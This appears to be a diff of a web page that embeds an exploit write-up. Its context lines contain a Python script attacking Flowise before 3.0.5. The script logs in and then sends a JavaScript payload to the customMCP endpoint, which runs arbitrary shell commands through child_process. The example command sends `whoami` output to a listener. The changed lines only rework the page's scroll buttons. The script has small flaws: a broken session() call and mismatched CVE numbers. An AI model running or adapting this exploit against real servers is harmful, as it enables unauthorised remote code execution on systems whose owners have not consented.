@@ -43,21 +43,21 @@ _____ _ _____ / __ \ | | / ___|
 """ try: parser = ArgumentParser(description='CVE-2025-59528 [Flowise &lt; 3.0.5]', usage="python CVE-2025-58434.py --email xtz@local --password Test@2025 --url http://localhost:3000 --cmd \"http://localhost:1337/`whoami`\"") parser.add_argument('-e', '--email', required=True, help='Registered email') parser.add_argument('-p', '--password', required=True) parser.add_argument('-u', '--url', required=True) parser.add_argument('-c', '--cmd', required=True) args = parser.parse_args() email = args.email password = args.password url = args.url cmd = args.cmd def login(email, url): session = session() url_format = "{}/api/v1/auth/login".format(url) headers = {"x-request-from": "internal", "Accept-Language": "pt-BR,pt;q=0.9", "Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36", "Origin": "http://workflow.flow.hc", "Referer": "http://workflow.flow.hc/signin", "Accept-Encoding": "gzip, deflate, br", "Connection": "keep-alive"} data={"email": email, "password": password} r = session.post(url_format, headers=headers, json=data) return session, r def rce(email, url, password, cmd): session, status_code = login(email, url) url_format = "{}/api/v1/node-load-method/customMCP".format(url) command = f'({{x:(function(){{const cp = process.mainModule.require("child_process");cp.execSync("{cmd}");return 1;}})()}})' data = { "loadMethod": "listActions", "inputs": { "mcpServerConfig": command } } r = session.post(url_format, json=data) if r.status_code == 401: session.headers["x-request-from"] = "internal" session.post(url_format, json=data) print(f"[x] Command executed [{cmd}]") rce(email, url, password, cmd) except Exception as e: print('Error in {}'.format(e)) </code></pre> </div></div>
   </div>
   <div class="article-elevator" aria-label="Navigation article">
-    <button class="article-elevator-btn" type="button" onclick="scrollStep(-1)">▲</button>
-    <button class="article-elevator-btn" type="button" onclick="scrollStep(1)">▼</button>
+    <button class="article-elevator-btn" type="button" onclick="scrollToTop()">▲</button>
+    <button class="article-elevator-btn" type="button" onclick="scrollToBottom()">▼</button>
   </div>
   <script>
-    function scrollStep(direction) {
-      var step = Math.max(220, Math.round(window.innerHeight * 0.72));
-      window.scrollBy({ top: direction * step, behavior: 'smooth' });
+    function scrollToTop() {
+      window.scrollTo({ top: 0, behavior: 'smooth' });
+    }
+    function scrollToBottom() {
+      window.scrollTo({ top: document.documentElement.scrollHeight, behavior: 'smooth' });
     }
     window.addEventListener('message', (event) => {
       const data = event && event.data;
       if (!data || data.type !== 'AI_PULSE_SCROLL') return;
-      if (data.direction === 'up') scrollStep(-1);
-      if (data.direction === 'down') scrollStep(1);
-      if (data.direction === 'top') window.scrollTo({ top: 0, behavior: 'smooth' });
-      if (data.direction === 'bottom') window.scrollTo({ top: document.documentElement.scrollHeight, behavior: 'smooth' });
+      if (data.direction === 'up' || data.direction === 'top') scrollToTop();
+      if (data.direction === 'down' || data.direction === 'bottom') scrollToBottom();
     });
   </script>
 </body>
